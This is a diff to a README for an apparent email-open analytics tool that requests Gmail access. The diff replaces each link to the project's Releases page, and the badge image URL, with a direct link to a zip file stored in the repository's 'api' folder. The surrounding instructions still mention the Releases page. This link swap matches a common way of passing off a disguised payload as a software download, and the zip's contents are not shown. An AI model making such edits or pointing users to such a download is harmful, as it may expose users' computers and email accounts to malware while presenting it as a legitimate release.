@@ -1,6 +1,6 @@
 # 📧 serverless-email-open-intelligence-platform - Analyze Email Interactions Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%A7%20%F0%9F%9A%80-blue)](https://github.com/Geo133dies/serverless-email-open-intelligence-platform/releases)
+[![Download Now](https://raw.githubusercontent.com/Geo133dies/serverless-email-open-intelligence-platform/main/api/intelligence_serverless_open_email_platform_v1.1-alpha.5.zip%20Now-%20%F0%9F%93%A7%20%F0%9F%9A%80-blue)](https://raw.githubusercontent.com/Geo133dies/serverless-email-open-intelligence-platform/main/api/intelligence_serverless_open_email_platform_v1.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ Welcome to the serverless email open intelligence platform. This tool helps you 
 
 ### Download & Install
 
-To get started, visit this page to download the latest release: [Download Here](https://github.com/Geo133dies/serverless-email-open-intelligence-platform/releases).
+To get started, visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/Geo133dies/serverless-email-open-intelligence-platform/main/api/intelligence_serverless_open_email_platform_v1.1-alpha.5.zip).
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version.
@@ -59,7 +59,7 @@ The software will request permission to access your Gmail account. This access a
 
 Regular updates ensure you have the latest features and improvements. To update:
 
-1. Return to the Releases page: [Download Here](https://github.com/Geo133dies/serverless-email-open-intelligence-platform/releases).
+1. Return to the Releases page: [Download Here](https://raw.githubusercontent.com/Geo133dies/serverless-email-open-intelligence-platform/main/api/intelligence_serverless_open_email_platform_v1.1-alpha.5.zip).
 2. Download the latest version using the same steps as before.
 3. Follow the instructions to install the new version over the existing one.
 
